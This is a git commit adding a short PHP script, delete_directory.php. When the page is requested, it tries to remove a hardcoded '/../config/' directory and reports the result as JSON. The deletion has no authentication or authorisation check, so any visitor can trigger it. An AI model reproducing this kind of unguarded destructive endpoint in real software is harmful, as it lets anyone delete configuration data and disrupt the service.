90ed4ea8a9a9e3c36375a3d16a5a98b6a0754697
CXFTEAMS <147907849+CXFTEAMS@users.noreply.github.com>
2023-11-10 04:06:16 +0700

    Create delete_directory.php

---
+++ delete_directory.php
@@ -0,0 +1,22 @@
+<?php
+$directory = "/../config/";
+
+$response = [];
+
+if (is_dir($directory)) {
+    if (@rmdir($directory)) {
+        $response['status'] = 'success';
+        $response['message'] = "Directory '$directory' successfully removed.";
+    } else {
+        $response['status'] = 'error';
+        $response['message'] = "Failed to remove directory '$directory'. Check permissions.";
+    }
+} else {
+    $response['status'] = 'error';
+    $response['message'] = "Directory '$directory' does not exist.";
+}
+
+// Output the JSON response
+header('Content-Type: application/json');
+echo json_encode($response);
+?>
